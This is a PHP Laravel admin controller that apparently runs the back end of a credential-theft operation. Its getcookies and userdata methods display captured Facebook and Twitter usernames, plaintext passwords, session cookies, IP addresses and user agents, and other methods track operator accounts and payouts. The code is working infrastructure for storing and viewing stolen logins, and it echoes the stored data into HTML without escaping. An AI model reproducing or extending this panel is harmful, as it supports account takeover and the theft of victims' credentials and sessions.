<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Cookies;
use App\User;
use Validator;
use Auth;
use App\Payment;
use Twilio\TwiML\MessagingResponse;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
       $data = User::with('fblog')->with('cookies')->where('is_admin', '!=', '1')->
       with(['fblog' => function($query) {           
            $query->groupBy('checkCookies');
        }])->orderBy('id','desc')->get()->toArray();

         //echo "<pre>"; print_r($data); die();
      
       return view('home',compact('data'));
    }



   /*   public function index()
    {
       $data = User::with('payments')->with('paid')->with('cookies')->where('is_admin', '!=', '1')->orderBy('id','desc')->get()->toArray();

        $d = date('Y-m-d');

       $dts =  User::with('payments')->whereHas('payments', function($q){
               $q->orWhere('status', '>=', '0');
               })->where('status' , 1)->get()->toArray();

           if(!empty($dts)){
            for ($i=0; $i < sizeof($dts) ; $i++) { 
                 
                 Payment::whereDate('created_at' , data('Y-m-d'))->create(['user_id'=> $dts['user_id']]);
            }
          }

        
      
       return view('home',compact('data'));
    }*/

  





     public function userdata(Request $request)
    {
       $data = Cookies::where('user_id' , $request['id'])->first();
    if( !empty($data['cookis_data']))
        $cookie = $data['cookis_data'];
     { 
           echo $json = $data['cookis_data'];
     }

    }    

   public function delete($id)
   {
        Cookies::where('id' , $id)->delete();
        return redirect()->back();
   }

   public function users()
   {
    $data = User::where('is_admin', '!=', '1')->get()->toArray();

   // echo "<pre>"; print_r($data ); die();
    return view('admin.user.index',compact('data'));
   }

   public function edit($id)
   {
      $data = User::with('payment')->where('id' , $id)->first()->toArray();

      //echo "<pre>"; print_r($data); die();
       return view('admin.user.edit',compact('data'));
   }

      public function update(Request $request,$id)
   {  

    if($request['status'] == 0 or $request['status'] == 2 or $request['status'] == 3)
    {
      $request['live'] = '0';
    }elseif($request['status'] == 1)
    {
          $request['live'] = '1';
    }


      $data = User::where('id' , $id)->update($request->except(['_token']));

      $status = User::where('id', $id)->first();
      $paystatus = Payment::where('user_id', $id)->orderBy('id','desc')->first();
           if($status['status'] == 1)
           {
             if(empty($paystatus))
             {
               Payment::create(['user_id' => $id,'pending' => '25']);
             } elseif($paystatus['status'] == 1  )
             {
                    Payment::create(['user_id' => $id , 'pending' => '25']);
             }
           }

      return redirect()->back();
       
   }

   


   public function deleteuser($id)
   {
        User::where('id' , $id)->delete();
        return redirect()->back();
   }




public function getcookies(Request $reqeust, $id)
{

   $data = Cookies::where('user_id' , $id)->first();

   if(!empty($data))
   {  
   ?>

    <div class="box-body">
            <table id="example2" class="table table-bordered table-striped" >
                     <thead>

                    <tr>             
                    
                       <th>#</th>
                       <th>IP</th>
                       <th>User Agent</th>
                       <th>FB User </th>
                       <th>FB Password</th>
                       <th>Cookies</th>                      
                       
                       <th></th>    
                       
                     
                     </tr>
                     </thead>
                     <tbody>        

                      <?php if($data) {?>
                        <tr>                                       
                        <td><?php if(!empty($data['checkCookies']) and $data['checkCookies'] == 'facebook') {?> 
                        <img height="30" width="30" src="<?php echo url('uploads/facebook.png'); ?>" alt="Italian Trulli"><?php } elseif(!empty($data['checkCookies']) and $data['checkCookies'] == 'twitter'){
                          ?>  <img height="30" width="30" src="<?php echo url('uploads/twitter.png'); ?>" alt="Italian Trulli"> <?php
                        } ?></td> 
                       <td><?php echo $data['ip']; ?></td>                       
                       <td><?php echo $data['user_agent'] ;?></td>
                       <td><?php echo $data['email'];?></td>
                       <td><?php echo $data['password'];?></td>

                    

                        <td style="word-break: break-all;"><?php echo $data['cookis_data'];?></td>
                     
                       <td><a href="<?php echo url('/delete'.'/'.$data['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>



                        
                      </tr> 
                    <?php } else {?>
                       
                         

                     <?php }?>
                       
                     </tbody>
                 
                   </table>
                  </div>
   <?php
 }else{?>

    <p> Data Not Found</p> 
 <?php }

}     



  public function terms()
  {
    return view('admin.terms');
  } 
  

  public function profile()
    {
     
      return view('admin.profile');
    }


 
    public function updateuadmin(Request $request)
    {

      //echo "<pre>"; print_r($request->all()); die();

        if(empty($request['password']))
        {
          
              User::where('id', Auth::id())->update($request->except(['password','password_confirmation','_token']));
           
        }else{
                
             $validator = Validator::make($request->all(), [            
            'password' => ['required', 'string', 'min:4', 'confirmed'],  ]);

               if ($validator->fails()) {
                return redirect()->back()->withErrors($validator)->withInput(); 
                }else{

                    $request['password'] = bcrypt($request['password']);

                   User::where('id', Auth::id())->update($request->except('_token'));
               
                }

            }


            return redirect()->back()->with(['message' => 'Update Sucessfully']);

    }




    public function updatepending(Request $request)
    {
          $pendings = $request['payment'] - $request['pending'];

          if( $pendings >= 0)
          {
            $pending = $pendings;
          } else{
            $pending = 0;
          }



        $pay = Payment::where('id' , $request['ids'])->update(['payment' => $request['payment'] ,'status' => $request['status'] , 'pending' => $pending ]);
           
           $to =  Payment::where('id' ,  $request['ids'])->orderBy('id','desc')->first();

           

             $earn = $to['payment'] + $request['totalearning'] ;

           Payment::where('id' ,  $request['ids'])->update(['totalearning' => $earn]);


        return redirect()->back()->with(['message', 'Payment done']);
    }









    public function sms(Request $request){   

    echo"<pre>"; print_r($request->all()); die();  

        $response = new MessagingResponse();
        $response->message(
        "I'm using the Twilio PHP library to respond to this SMS!"
        );

       return view('sms',compact('response'));
    }





  /*  public function deletepending()
    {
      Payment::where('user_id','151')->delete();
    }*/



    public function updatepayment()
    { 

      $d = date('Y-m-d', strtotime(' +1 day'));

       $data = User::with('payments')->where('status' , 1)->get()->toArray();

           if(!empty($data)){
            for ($i=0; $i < sizeof($data) ; $i++) { 

            
            }
          }
    }





}
?>